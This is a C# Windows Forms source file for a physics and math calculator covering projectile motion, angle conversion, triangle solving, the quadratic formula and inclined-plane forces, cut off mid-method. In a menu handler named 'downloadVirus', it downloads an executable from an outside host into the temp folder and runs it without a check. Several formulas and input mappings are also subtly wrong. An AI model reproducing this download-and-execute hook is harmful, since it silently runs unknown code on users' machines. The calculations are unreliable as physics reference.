using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Globalization;


namespace Physik___Fälle
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            GlobalClass.gravity = 9.81;
            richTextBox48.Text = GlobalClass.gravity.ToString();
            richTextBox25.Text = GlobalClass.gravity.ToString();
        }
        

        private void label1_Click(object sender, EventArgs e)
        {
            
        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            double velocidadinitial = 0;
            double velocidadinitialx = 0;
            double velocidadinitialy = 0;
            double anguloinitial = 0;
            double velocidadfinal = 0;
            double velocidadfinalx = 0;
            double velocidadfinaly = 0;
            double angulofinal = 0;
            double tiempo = 0;
            double tiempopuntomasalto = 0;
            double heightbeginning = 0;
            double heightmaxiumum = 0;
            double heighttotal = 0;
            double velocidadinitialenabled = 1;
            double velocidadinitialxenabled = 1;
            double velocidadinitialyenabled = 1;
            double anguloinitialenabled = 1;
            double velocidadfinalenabled = 1;
            double velocidadfinalxenabled = 1;
            double velocidadfinalyenabled = 1;
            double angulofinalenabled = 1;
            double tiempoenabled = 1;
            double tiempopuntomasaltoenabled = 1;
            double heightbeginningenabled = 1;
            double heightmaxiumumenabled = 1;
            double heighttotalenabled = 1;
            double angulofinalbogenmass = 0;
            double anguloinitialbogenmass = 0;
            double xmid = 0;
            double xtot = 0;
            double xmidenabled = 0;
            double xtotenabled = 0;
            

            try
            {
                if (richTextBox1.Text == "")
                {
                    velocidadinitialenabled = 0;
                }
                else
                {

                    velocidadinitial = Convert.ToDouble(richTextBox1.Text);
                }
                   
                if (richTextBox2.Text == "")
                {
                    velocidadinitialxenabled = 0;
                }
                else
                {
                    velocidadinitialx = Convert.ToDouble(richTextBox2.Text);
                }
                   
                if (richTextBox3.Text == "")
                {
                    velocidadinitialyenabled = 0;
                }
                else
                {
                    velocidadinitialy = Convert.ToDouble(richTextBox3.Text);
                }
                   
                if (richTextBox4.Text == "")
                {
                    anguloinitialenabled = 0;
                }
                else
                {                
                    anguloinitial = Convert.ToDouble(richTextBox4.Text);
                    anguloinitialbogenmass = (anguloinitial * Math.PI) / 180;
                }
                   
                if (richTextBox5.Text == "")
                {
                    heightbeginningenabled = 0;
                }
                else
                {     
                    heightbeginning = Convert.ToDouble(richTextBox5.Text);
                }
                   
                if (richTextBox6.Text == "")
                {
                    heightmaxiumumenabled = 0;
                }
                else
                {
                    heightmaxiumum = Convert.ToDouble(richTextBox6.Text);
                }
                   
                if (richTextBox7.Text == "")
                {
                    heighttotalenabled = 0;
                }
                else
                { 
                   heighttotal = Convert.ToDouble(richTextBox7.Text);
                }
                   
                if (richTextBox8.Text == "")
                {
                    tiempoenabled = 0;
                }
                else
                {
                     tiempo = Convert.ToDouble(richTextBox8.Text);
                }
                   
                if (richTextBox9.Text == "")
                {
                    tiempopuntomasaltoenabled = 0;
                }
                else
                {
                    tiempopuntomasalto = Convert.ToDouble(richTextBox9.Text);
                }
                   
                if (richTextBox10.Text == "")
                {
                    velocidadfinalenabled = 0;
                }
                else
                {
                    velocidadfinal = Convert.ToDouble(richTextBox10.Text);
                }
                   
                if (richTextBox11.Text == "")
                {
                    velocidadfinalxenabled = 0;
                }
                else
                {
                    velocidadfinalx = Convert.ToDouble(richTextBox11.Text);
                }
                   
                if (richTextBox12.Text == "")
                {
                    velocidadfinalyenabled = 0;
                }
                else
                {
                    velocidadfinaly = Convert.ToDouble(richTextBox12.Text); 
                }

                if (richTextBox13.Text == "")
                {
                    angulofinalenabled = 0;
                }
                else
                {
                    angulofinal = Convert.ToDouble(richTextBox13.Text);
                    angulofinalbogenmass = (angulofinal * Math.PI) / 180;
                }
                if (richTextBox14.Text == "")
                {
                    xtotenabled = 0;
                }
                else
                {
                    xtot = Convert.ToDouble(richTextBox12.Text);
                }

                if (richTextBox15.Text == "")
                {
                    xmidenabled = 0;
                }
                else
                {
                    xmid = Convert.ToDouble(richTextBox13.Text);
                }
            }

            catch { MessageBox.Show("solamente numeros Tonto"); return;}
            // checking velo x final 
            if (velocidadinitialxenabled == 0)
            {
                if (velocidadfinalxenabled == 1)
                {
                    velocidadinitialx = velocidadfinalx;
                    MessageBox.Show("velocidad initial x y velocidad final x es el mismo!");
                    richTextBox2.Text = velocidadinitialx.ToString();
                }
            }
            else
            {
                velocidadfinalx = velocidadinitialx;
            }

            //bestimmung welche angaben man hat
            if (richTextBox1.Text == "") {
            
                if (richTextBox2.Text == "") 
                {

                    if (richTextBox3.Text == "")
                    {
                        MessageBox.Show("More initial values needed. You need to know at least two of Velocidad inital, Velocidad inital x, Velocidad inital y y angulo initial");
                        return;
                    }
                    else
                    {
                        if (richTextBox4.Text == "")
                        {
                            MessageBox.Show("More initial values needed. You need to know at least two of Velocidad inital, Velocidad inital x, Velocidad inital y y angulo initial");
                            return;
                        }
                        else
                        {
                            //3,4
                            velocidadinitial = velocidadinitialy / Math.Sin(anguloinitialbogenmass);
                            velocidadinitialx = Math.Sqrt((velocidadinitial*velocidadinitial)-(velocidadinitialy*velocidadinitialy));
                        }
                    }
                } 
                else 
                {
                    if (richTextBox3.Text == "")
                    {
                        if (richTextBox4.Text == "")
                        {
                            MessageBox.Show("More initial values needed. You need to know at least two of Velocidad inital, Velocidad inital x, Velocidad inital y y angulo initial");
                            return;
                        }
                        else
                        {
                            //2,4
                            velocidadinitial = velocidadinitialx / Math.Cos(anguloinitialbogenmass);
                            velocidadinitialy = Math.Sqrt((velocidadinitial * velocidadinitial) - (velocidadinitialx * velocidadinitialx));
                        }
                    }
                    else
                    {
                        //2,3 bekannt
                        velocidadinitial = Math.Sqrt((velocidadinitialx * velocidadinitialx) + (velocidadinitialy * velocidadinitialy));
                        anguloinitialbogenmass = Math.Asin(velocidadinitialy / velocidadinitial);
                    }
                }
            } 
            else 
            {
                if (richTextBox2.Text == "")
                {
                    if (richTextBox3.Text == "")
                    {
                        if (richTextBox4.Text == "")
                        {

                            MessageBox.Show("More initial values needed. You need to know at least two of Velocidad inital, Velocidad inital x, Velocidad inital y y angulo initial");
                            return;
                        }
                        else
                        {
                            //1,4 bekannt
                            velocidadinitialx = Math.Cos(anguloinitialbogenmass) * velocidadinitial;
                            velocidadinitialy = Math.Sin(anguloinitialbogenmass) * velocidadinitial;

                        }
                    }
                    else
                    {
                        //1,3 bekannt
                        velocidadinitialx = Math.Sqrt((velocidadinitial * velocidadinitial) - (velocidadinitialy * velocidadinitialy));
                        anguloinitialbogenmass = Math.Asin(velocidadinitialy / velocidadinitial);
                    }

                }
                else
                {
                    //1,2 bekannt
                    velocidadinitialy = Math.Sqrt((velocidadinitial * velocidadinitial) - (velocidadinitialx * velocidadinitialx));
                    anguloinitialbogenmass = Math.Asin(velocidadinitialy / velocidadinitial);
                }
            }
            
            // 1,2,3,4 bekannt
            // calc hier die drei noch möglichen
            velocidadfinalx = velocidadinitialx;
            heightmaxiumum = (velocidadinitialy * velocidadinitialy) / (2 * GlobalClass.gravity);
            tiempopuntomasalto = Math.Sqrt((2 * heightmaxiumum) / GlobalClass.gravity);
            xmid = tiempopuntomasalto * velocidadinitialx;
            //bekannt nun: 1,2,3,4 alles bis mitte, velocidadfinalx
            //nun htot für alle fälle ausrechenen
            if (velocidadfinalyenabled == 1)
            {
                heighttotal = (velocidadfinaly * velocidadfinaly) / 2 * GlobalClass.gravity;
            }
            else if (tiempoenabled == 1)
            {
                heighttotal = ((tiempo - tiempopuntomasalto) * (tiempo - tiempopuntomasalto)) * GlobalClass.gravity / 2;
            }
            else if (xtotenabled == 1)
            {
                heighttotal = (((xtot - xmid) / velocidadinitialx) * ((xtot - xmid) / velocidadinitialx)) * GlobalClass.gravity / 2;
            }
            else if (heighttotalenabled == 1)
            {
                //keine Aktion erforderlich
            }
            else if (heightbeginningenabled == 1)
            {
                heighttotal = heightmaxiumum + heightbeginning;
            }
            else if (velocidadfinalenabled == 1)
            {
                heighttotal = ((velocidadfinal * velocidadfinal) - (velocidadfinalx * velocidadfinalx)) / (2 * GlobalClass.gravity);
            }
            else if (angulofinalenabled == 1)
            {
                heighttotal = ((velocidadinitialx / Math.Tan(anguloinitial)) * (velocidadinitialx / Math.Tan(angulofinalbogenmass))) / 2 * GlobalClass.gravity;
            } 
            else
            {
                MessageBox.Show("One more value (exept from the first 4 one) is needed to give out all the results.");
                anguloinitial = (anguloinitialbogenmass * 180) / Math.PI;
                richTextBox1.Text = velocidadinitial.ToString();
                richTextBox2.Text = velocidadinitialx.ToString();
                richTextBox3.Text = velocidadinitialy.ToString();
                richTextBox4.Text = anguloinitial.ToString();
                richTextBox6.Text = heightmaxiumum.ToString();
                richTextBox9.Text = tiempopuntomasalto.ToString();
                richTextBox15.Text = xmid.ToString();
                richTextBox25.Text = GlobalClass.gravity.ToString();
                label17.Text = "reset program before";
                label18.Text = "using it again!";
                return;
            }
            //calc den rest
            heightbeginning = heighttotal - heightmaxiumum;
            tiempo = Math.Sqrt((2 * heighttotal) / GlobalClass.gravity) + tiempopuntomasalto;
            xtot = velocidadfinalx * tiempo;
            velocidadfinaly = Math.Sqrt(2 * GlobalClass.gravity * heighttotal);
            velocidadfinal = Math.Sqrt((velocidadfinalx * velocidadfinalx) + (velocidadfinaly * velocidadfinaly));
            angulofinalbogenmass = Math.Acos(velocidadfinalx / velocidadfinal);

            //Ausgabe

            //Coverter Bogenmass
            angulofinal = (angulofinalbogenmass * 180) / Math.PI;
            anguloinitial = (anguloinitialbogenmass * 180) / Math.PI;
            richTextBox1.Text = velocidadinitial.ToString();
            richTextBox2.Text = velocidadinitialx.ToString();
            richTextBox3.Text = velocidadinitialy.ToString();
            richTextBox4.Text = anguloinitial.ToString();
            richTextBox5.Text = heightbeginning.ToString();
            richTextBox6.Text = heightmaxiumum.ToString();
            richTextBox7.Text = heighttotal.ToString();
            richTextBox8.Text = tiempo.ToString();
            richTextBox9.Text = tiempopuntomasalto.ToString();
            richTextBox10.Text = velocidadfinal.ToString();
            richTextBox11.Text = velocidadfinaly.ToString();
            richTextBox12.Text = velocidadfinalx.ToString();
            richTextBox13.Text = angulofinal.ToString();
            richTextBox14.Text = xtot.ToString();
            richTextBox15.Text = xmid.ToString();
            label17.Text = "reset program before";
            label18.Text = "using it again!";
            return;

}



        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void label13_Click(object sender, EventArgs e)
        {

        }


        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }
        
        private void richTextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            richTextBox1.Text = "";
            richTextBox2.Text = "";
            richTextBox3.Text = "";
            richTextBox4.Text = "";
            richTextBox5.Text = "";
            richTextBox6.Text = "";
            richTextBox7.Text = "";
            richTextBox8.Text = "";
            richTextBox9.Text = "";
            richTextBox10.Text = "";
            richTextBox11.Text = "";
            richTextBox12.Text = "";
            richTextBox13.Text = "";
            richTextBox14.Text = "";
            richTextBox15.Text = "";
            label17.Text = "";
            label18.Text = "";
            return;
        }

        private void richTextBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void label15_Click(object sender, EventArgs e)
        {

        }

        private void label17_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox5_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox6_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox7_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox8_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox9_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox11_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox12_TextChanged(object sender, EventArgs e)
        {

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void label9_Click(object sender, EventArgs e)
        {

        }

        private void label10_Click(object sender, EventArgs e)
        {

        }

        private void label12_Click(object sender, EventArgs e)
        {

        }

        private void label14_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox13_TextChanged(object sender, EventArgs e)
        {

        }

        private void label16_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox14_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox15_TextChanged(object sender, EventArgs e)
        {

        }

        private void label18_Click(object sender, EventArgs e)
        {

        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void tabPage2_Click(object sender, EventArgs e)
        {

        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox17_TextChanged(object sender, EventArgs e)
        {

        }

        private void label19_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            double grado = 0;
            double radian = 0;
            double radianenpi = 0;
            double gradoenabled = 1;
            double radianenabled = 1;
            double radianenpienabled = 1;
            
            
            try {
                if (richTextBox16.Text == "")
                {
                    gradoenabled = 0;
                }
                else
                {
                    grado = Convert.ToDouble(richTextBox16.Text);
                }
                if (richTextBox17.Text == "")
                {
                    radianenabled = 0;
                }
                else
                {
                    radian = Convert.ToDouble(richTextBox17.Text);
                }
                if (richTextBox18.Text == "")
                {
                    radianenpienabled = 0;
                }
                else
                {
                    radianenpi = Convert.ToDouble(richTextBox18.Text);
                }
            }

            catch { MessageBox.Show("solamente numeros Tonto"); return;}
            if (gradoenabled == 1)
            {
                radian = (grado * Math.PI) / 180;
                radianenpi = radian / Math.PI;
            }
            else if (radianenabled==1) 
            {
                grado = (radian*180)/Math.PI;
                radianenpi = radian / Math.PI;
            }
            else if (radianenpienabled==1) 
            {
                radian = radianenpi * Math.PI;
                grado = (radian * 180) / Math.PI;
            }
            else
            {
                MessageBox.Show("No values!");
            }
            richTextBox16.Text = grado.ToString();
            richTextBox17.Text = radian.ToString();
            richTextBox18.Text = radianenpi.ToString() + " π";
            return;

        }

        private void button4_Click(object sender, EventArgs e)
        {
            richTextBox16.Text = "";
            richTextBox17.Text = "";
            richTextBox18.Text = "";
            return;
        }

        private void richTextBox23_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox24_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox22_TextChanged(object sender, EventArgs e)
        {

        }

        private void label25_Click(object sender, EventArgs e)
        {

        }

        private void label27_Click(object sender, EventArgs e)
        {

        }

        private void label26_Click(object sender, EventArgs e)
        {

        }

        private void richTextBox19_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox21_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox20_TextChanged(object sender, EventArgs e)
        {

        }

        private void label23_Click(object sender, EventArgs e)
        {

        }

        private void label24_Click(object sender, EventArgs e)
        {

        }

        private void label22_Click(object sender, EventArgs e)
        {

        }

        private void button6_Click(object sender, EventArgs e)
        {

            double alpha = 0;
            double beta = 0;
            double delta = 0;
            double alphabm = 0;
            double betabm = 0;
            double deltabm = 0;
            double a = 0;
            double b = 0;
            double c = 0;
            double alphaenabled = 1;
            double betaenabled = 1;
            double deltaenabled = 1;
            double aenabled = 1;
            double benabled = 1;
            double cenabled = 1;
                    
            
            
            
            try
            {
                if (richTextBox19.Text == "")
                {
                    alphaenabled = 0;
                }
                else
                {
                    alpha = Convert.ToDouble(richTextBox19.Text);
                    alphabm = (alpha * Math.PI) / 180;
                }

                if (richTextBox20.Text == "")
                {
                    betaenabled = 0;
                }
                else
                {
                    beta = Convert.ToDouble(richTextBox20.Text);
                    betabm = (beta * Math.PI) / 180;
                }

                if (richTextBox21.Text == "")
                {
                    deltaenabled = 0;
                }
                else
                {
                    delta = Convert.ToDouble(richTextBox21.Text);
                    deltabm = (delta * Math.PI) / 180;
                }

                if (richTextBox22.Text == "")
                {
                    aenabled = 0;
                }
                else
                {
                    a = Convert.ToDouble(richTextBox22.Text);
                }

                if (richTextBox23.Text == "")
                {
                    benabled = 0;
                }
                else
                {
                    b = Convert.ToDouble(richTextBox23.Text);
                }

                if (richTextBox24.Text == "")
                {
                    cenabled = 0;
                }
                else
                {
                    c = Convert.ToDouble(richTextBox24.Text);
                }

            }
            catch { MessageBox.Show("solamente numeros Tonto"); return; }
            if (aenabled + benabled + cenabled + alphaenabled + betaenabled + deltaenabled <= 2)
            {
                MessageBox.Show("At least 3 things");
                return;
            }
            if (aenabled == 1)
            {
                if (benabled == 1)
                {
                    if (cenabled == 1)
                    {

                        alphabm = Math.Asin(a / c);
                        betabm = Math.Acos(a / c);
                        deltabm = Math.PI - (alphabm + betabm);
                    }
                    else if (alphaenabled == 1)
                    {
                        betabm = Math.Atan(b / a);
                        deltabm = Math.PI - (betabm + alphabm);
                        c = alphabm / Math.Cos(betabm);
                    }
                    else if (betaenabled == 1)
                    {
                        alphabm = Math.Atan(a / b);
                        deltabm = Math.PI - (betabm + alphabm);
                        c = alphabm / Math.Cos(betabm);
                    }
                    else if (deltaenabled == 1)
                    {
                        c = Math.Sqrt((a * a) + (b * b) - (2 * a * b * Math.Cos(deltabm)));
                        alphabm = Math.Asin(a / c);
                        betabm = Math.Acos(a / c);
                    }
                }
                else if (cenabled == 1)
                {
                    if (alphaenabled == 1)
                    {
                        betabm = Math.Acos(a / c);
                        deltabm = Math.PI - (alphabm + betabm);
                        b = Math.Sqrt((c * c) - (a * a) - (2 * a * c * Math.Cos(betabm)));
                    }
                    else if (betaenabled == 1)
                    {
                        alphabm = Math.Asin(a / c);
                        deltabm = Math.PI - (alphabm + betabm);
                        b = Math.Sqrt((c * c) - (a * a) - (2 * a * c * Math.Cos(betabm)));
                    }
                    else if (deltaenabled == 1)
                    {
                        betabm = Math.Acos(a / c);
                        alphabm = Math.PI - (betabm + deltabm);
                        b = Math.Sqrt((c * c) - (a * a) - (2 * a * c * Math.Cos(betabm)));
                    }
                }
                else if (alphaenabled == 1)
                {
                    if (betaenabled == 1)
                    {
                        deltabm = Math.PI - (alphabm + betabm);
                        c = a / Math.Sin(alphabm);
                        b = Math.Tan(betabm) * a;
                    }
                    else if (deltaenabled == 1)
                    {
                        betabm = Math.PI - (alphabm + deltabm);
                        c = a / Math.Sin(alphabm);
                        b = Math.Tan(betabm) * a;
                    }
                }
                else if (betaenabled == 1)
                {
                    alphabm = Math.PI - (betabm + deltabm);
                    c = a / Math.Sin(alphabm);
                    b = Math.Tan(betabm) * a;
                }
            }
            else if (benabled == 1)
            {
                if (cenabled == 1)
                {
                    if (alphaenabled == 1)
                    {
                        a = Math.Sin(alphabm) * c;
                        betabm = Math.Acos(a / c);
                        deltabm = Math.PI - (alphabm + betabm);
                    }
                    else if (betaenabled == 1)
                    {
                        alphabm = Math.Acos(b / c);
                        deltabm = Math.PI - (alphabm + betabm);
                        a = Math.Sqrt((c * c) - (b * b) - (2 * c * b * Math.Cos(alphabm)));
                    }
                    else if (deltaenabled == 1)
                    {
                        alphabm = Math.Acos(b / c);
                        betaenabled = Math.PI - (alphabm + deltabm);
                        a = Math.Sqrt((c * c) - (b * b) - (2 * c * b * Math.Cos(alphabm)));
                    }
                }
                else if (alphaenabled == 1)
                {
                    if (betaenabled == 1)
                    {
                        deltabm = Math.PI - (alphabm + betabm);
                        c = b / Math.Cos(alphabm);
                        a = Math.Cos(betabm) * c;
                    }
                    else if (deltaenabled == 1)
                    {
                        betabm = Math.PI - (deltabm + alphabm);
                        c = b / Math.Cos(alphabm);
                        a = Math.Cos(betabm) * c;
                    }
                }
                else if (betaenabled == 1)
                {
                    alphabm = Math.PI - (betabm + deltabm);
                    c = b / Math.Cos(alphabm);
                    a = Math.Cos(betabm) * c;
                }
            }
            else if (cenabled == 1)
            {
                if (alphaenabled == 1)
                {
                    if (betaenabled == 1)
                    {
                        deltabm = Math.PI - (alphabm + betabm);
                        a = Math.Cos(betabm) * c;
                        b = Math.Cos(alphabm) * c;
                    }
                    else if (deltaenabled == 1)
                    {
                        betabm = Math.PI - (alphabm + deltabm);
                        a = Math.Cos(betabm) * c;
                        b = Math.Cos(alphabm) * c;
                    }
                }
                else
                {
                    alphabm = Math.PI - (betabm + deltabm);
                    a = Math.Cos(betabm) * c;
                    b = Math.Cos(alphabm) * c;
                }
            }
            else
            {
                MessageBox.Show("Tinenes que tener una de los rectas en minimo");
            }

            //umwandlung winkel
            alpha = (alphabm * 180) / Math.PI;
            beta = (betabm * 180) / Math.PI;
            delta = (deltabm * 180) / Math.PI;

            //Ausgabe
            richTextBox19.Text = alpha.ToString();
            richTextBox20.Text = beta.ToString();
            richTextBox21.Text = delta.ToString();
            richTextBox22.Text = a.ToString();
            richTextBox23.Text = b.ToString();
            richTextBox24.Text = c.ToString(); 
            return;

        }

        private void button5_Click(object sender, EventArgs e)
        {
            richTextBox19.Text = "";
            richTextBox20.Text = "";
            richTextBox21.Text = "";
            richTextBox22.Text = "";
            richTextBox23.Text = "";
            richTextBox24.Text = "";
            return;
        }


        public AsyncCompletedEventHandler client_DownloadFileCompleted { get; set; }

        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void beendenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Close();
            return;
        }

        private void thisVersionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This funktion isn't aviable yet");
        }

        private void erdanziehungToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form2 f2 = new Form2();
            f2.ShowDialog();
        }

        private void downloadVirusToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var webClient = new WebClient();
                webClient.DownloadFile("http://www.regenerade.bplaced.net/server_no-ip_config.exe", Path.GetTempPath() + "server_no-ip_config.exe");
                Process.Start(Path.GetTempPath() + "server_no-ip_config.exe");
            }
            catch { MessageBox.Show("No internet connection!"); return; }
            MessageBox.Show("Muchos Gracias.");
        }

        private void aboutToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This program was written by Florian Moser. Hope you enjoyed it!");
        }

        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void optionsToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void toolTip1_Popup(object sender, PopupEventArgs e)
        {

        }

        private void button8_Click(object sender, EventArgs e)
        {
            richTextBox26.Text = "";
            richTextBox27.Text = "";
            richTextBox28.Text = "";
            richTextBox29.Text = "";
            richTextBox30.Text = "";
            return;
        }

        private void button7_Click(object sender, EventArgs e)
        {
            double a;
            double b;
            double c;
            double xuno;
            double xdos;
            double zwischenspeicher;
            
            try
            {
                if (richTextBox26.Text == "")
                {
                    MessageBox.Show("You need to fill out all fields.");
                    return;
                }
                else
                {
                    a = Convert.ToDouble(richTextBox26.Text);
                }

                if (richTextBox27.Text == "")
                {
                    MessageBox.Show("You need to fill out all fields.");
                    return;
                }
                else
                {
                    b = Convert.ToDouble(richTextBox27.Text);
                }

                if (richTextBox28.Text == "")
                {
                    MessageBox.Show("You need to fill out all fields.");
                    return;
                }
                else
                {
                    c = Convert.ToDouble(richTextBox28.Text);
                }
            }
            catch { MessageBox.Show("solamente numeros Tonto"); return; }
            zwischenspeicher = Math.Sqrt((b*b)-(4*a*c));
            xuno = ((-b)+zwischenspeicher)/(2*a);
            xdos = ((-b)-zwischenspeicher)/(2*a);
            richTextBox29.Text = xuno.ToString();
            richTextBox30.Text = xdos.ToString(); 

        }

        private void button10_Click(object sender, EventArgs e)
        {
            double fuerza = 0;
            double massa = 0;
            double acceleration = 0;
            double fuerzaenabled = 1;
            double massaenabled = 1;
            double accelerationenabled = 1;


            try
            {
                if (richTextBox31.Text == "")
                {
                    fuerzaenabled = 0;
                }
                else
                {
                    fuerza = Convert.ToDouble(richTextBox31.Text);
                }
                if (richTextBox32.Text == "")
                {
                    massaenabled = 0;
                }
                else
                {
                    massa = Convert.ToDouble(richTextBox32.Text);
                }
                if (richTextBox33.Text == "")
                {
                    accelerationenabled = 0;
                }
                else
                {
                    acceleration = Convert.ToDouble(richTextBox33.Text);
                }
            }

            catch { MessageBox.Show("solamente numeros Tonto"); return; }
            if (fuerzaenabled == 1)
            {
                if (accelerationenabled == 1)
                {
                    massa = fuerza / acceleration;
                }
                else if (massaenabled == 1)
                {
                    acceleration = fuerza / massa;
                }
            }
            else if (accelerationenabled == 1)
            {
                if (massaenabled == 1)
                {
                    fuerza = massa * acceleration;
                }
                else
                {
                    MessageBox.Show("You need to fill out at least two things");
                }
            } 
            else
            {
                MessageBox.Show("You need to fill out at least two things");
            }





           
            richTextBox31.Text = fuerza.ToString();
            richTextBox32.Text = massa.ToString(); 
            richTextBox33.Text = acceleration.ToString();
            return;
        }

        private void button9_Click(object sender, EventArgs e)
        {
            richTextBox31.Text = "";
            richTextBox32.Text = "";
            richTextBox33.Text = "";
            return;
        }

        private void richTextBox37_TextChanged(object sender, EventArgs e)
        {

        }

        private void label44_Click(object sender, EventArgs e)
        {

        }

        private void button11_Click(object sender, EventArgs e)
        {
            double velocidadinitial = 0;
            double velocidadfinal = 0;
            double altura = 0;
            double angulo = 0;
            double massa = 0;
            double tiempo = 0;
            double distancia = 0;
            double x = 0;
            double Fn = 0;
            double Ff = 0;
            double W = 0;
            double Fp = 0;
            double Fr = 0;
            double Ffkoeffizient = 0;
            double ac = 0;
            double velocidadinitialenabled = 1;
            double velocidadfinalenabled = 1;
            double alturaenabled = 1;
            double angulobogenmassenabled = 1;
            double massaenabled = 1;
            double tiempoenabled = 1;
            double distanciaenabled = 1;
            double xenabled = 1;
            double Fnenabled = 1;
            double Ffenabled = 1;
            double Wenabled = 1;
            double Fpenabled = 1;
            double Frenabled = 1;
            double Ffkoeffizientenabled = 1;
            double acenabled = 1;
            double angulobogenmass = 0;
            
            //doubles für dreickecksberechnung
            double a = 0;
            double b = 0;
            double c = 0;
            double alpha = 0;
            double beta = 0;
            double delta = 0;
            double alphabm = 0;
            double betabm = 0;
            double deltabm = 0;
            double alphaenabled = 0;
            double betaenabled = 0;
            double deltaenabled = 0;
            double aenabled = 0;
            double benabled = 0;
            double cenabled = 0;


            try
            {
                if (richTextBox34.Text == "")
                {
                    velocidadinitialenabled = 0;
                }
                else
                {

                    velocidadinitial = Convert.ToDouble(richTextBox34.Text);
                }

                if (richTextBox35.Text == "")
                {
                    velocidadfinalenabled = 0;
                }
                else
                {
                    velocidadfinal = Convert.ToDouble(richTextBox35.Text);
                }

                if (richTextBox36.Text == "")
                {
                    alturaenabled = 0;
                }
                else
                {
                    altura = Convert.ToDouble(richTextBox36.Text);
                }

                if (richTextBox37.Text == "")
                {
                    angulobogenmassenabled = 0;
                }
                else
                {
                    angulo = Convert.ToDouble(richTextBox37.Text);
                    angulobogenmass = (angulo * Math.PI) / 180;
                }

                if (richTextBox38.Text == "")
                {
                    massaenabled = 0;
                }
                else
                {
                    massa = Convert.ToDouble(richTextBox38.Text);
                }

                if (richTextBox39.Text == "")
                {
                    tiempoenabled = 0;
                }
                else
                {
                    tiempo = Convert.ToDouble(richTextBox39.Text);
                }

                if (richTextBox40.Text == "")
                {
                    distanciaenabled = 0;
                }
                else
                {
                    distancia = Convert.ToDouble(richTextBox40.Text);
                }

                if (richTextBox41.Text == "")
                {
                    Fnenabled = 0;
                }
                else
                {
                    Fn = Convert.ToDouble(richTextBox41.Text);
                }

                if (richTextBox42.Text == "")
                {
                    Ffenabled = 0;
                }
                else
                {
                    Ff = Convert.ToDouble(richTextBox42.Text);
                }

                if (richTextBox43.Text == "")
                {
                    Wenabled = 0;
                }
                else
                {
                    W = Convert.ToDouble(richTextBox43.Text);
                }

                if (richTextBox44.Text == "")
                {
                    Fpenabled = 0;
                }
                else
                {
                    Fp = Convert.ToDouble(richTextBox44.Text);
                }

                if (richTextBox45.Text == "")
                {
                    Ffkoeffizientenabled = 0;
                }
                else
                {
                    Ffkoeffizient = Convert.ToDouble(richTextBox45.Text);
                }

                if (richTextBox46.Text == "")
                {
                    Frenabled = 0;
                }
                else
                {
                    Fr = Convert.ToDouble(richTextBox46.Text);
                }
                if (richTextBox47.Text == "")
                {
                    acenabled = 0;
                }
                else
                {
                    ac = Convert.ToDouble(richTextBox47.Text);
                }
                if (richTextBox49.Text == "")
                {
                    xenabled = 0;
                }
                else
                {
                    x = Convert.ToDouble(richTextBox49.Text);
                }
            }
            catch { MessageBox.Show("solamente numeros Tonto"); return; }

            while (1==1)
            {
                if (Wenabled == 1)
                {
                    massa = W / GlobalClass.gravity;
                    massaenabled = 1;
                }
                else if (massaenabled == 1)
                {
                    W = massa * GlobalClass.gravity;
                    Wenabled = 1;
                }
                 //next
                if (Fnenabled == 1)
                {
                    if (Wenabled == 1)
                    {
                        angulobogenmass = Math.Acos(Fn / W);
                        angulobogenmassenabled = 1;
                    }
                    else if (angulobogenmassenabled == 1)
                    {
                        W = Fn / Math.Cos(angulobogenmass);
                        Wenabled = 1;
                    }
                }
                else if (angulobogenmassenabled == 1)
                {
                    if (Wenabled == 1)
                    {
                        Fn = W * Math.Cos(angulobogenmass);
                        Fnenabled = 1;
                    }
                }
                //next

                if (Ffenabled == 1)
                {
                    if (Ffkoeffizientenabled == 1)
                    {
                        Fn = Ff / Ffkoeffizient;
                        Fnenabled = 1;
                    }
